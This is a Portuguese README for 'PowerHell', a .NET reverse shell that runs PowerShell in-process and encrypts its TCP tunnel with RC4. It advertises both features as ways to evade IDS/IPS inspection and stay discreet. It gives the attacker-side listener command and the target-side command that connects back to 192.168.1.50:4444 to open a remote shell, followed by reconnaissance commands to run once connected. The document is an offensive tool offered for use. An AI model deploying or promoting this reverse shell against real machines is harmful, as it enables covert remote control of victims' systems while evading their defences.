# PowerHell
Este script é um Reverse Shell em .NET que integra o motor do PowerShell via Runspaces para execução de comandos remotos sobre TCP com cifragem RC4. Ao hospedar a automação diretamente em memória, ele dispensa a chamada do processo powershell.exe, aumentando a eficiência e reduzindo a visibilidade operacional.
Diferenciais Estratégicos

    In-Process Execution: Executa scripts via System.Management.Automation, evitando a criação de novos processos de console.

    Criptografia RC4: Protege o tráfego (comandos e outputs) contra inspeção de pacotes (IDS/IPS) via rede.

    Evasão de Perfil: O Runspace isolado ignora scripts de perfil ($PROFILE), acelerando a execução e mantendo a discrição.

Modos de Operação

    Local: Interface de linha de comando (CLI) convencional para testes.

    Remoto: Cliente TCP persistente com criptografia simétrica.

Exemplos de Uso
1. Preparação do Servidor (Atacante)

Antes de executar o cliente, o servidor (em Python ou ferramenta similar) deve estar ouvindo na porta configurada com a mesma chave de criptografia.
Bash

# Exemplo de escuta no servidor
```
python servidor.py 0.0.0.0 4444 MinhaChaveSecreta
```

2. Execução do Cliente (Alvo)

O executável aceita argumentos para definir o destino e a segurança da sessão.

Conexão Remota (Reverse Shell):
Conecta ao IP 192.168.1.50 na porta 4444 utilizando a chave RC4 para cifrar o túnel.
DOS
```
Powerhell.exe -c 192.168.1.50 4444 MinhaChaveSecreta
```

Execução Local (Modo Console):
Inicia o host de PowerShell customizado diretamente na máquina atual, sem conexão de rede.
DOS

Powerhell.exe

3. Comandos Comuns na Sessão Remota

Uma vez conectado, você pode interagir com o Runspace normalmente:

    whoami: Verifica o privilégio atual.

    Get-Process: Lista processos rodando no alvo.

    ls C:\Users\: Navega no sistema de arquivos.

    exit: Encerra a conexão e fecha o Runspace de forma limpa.
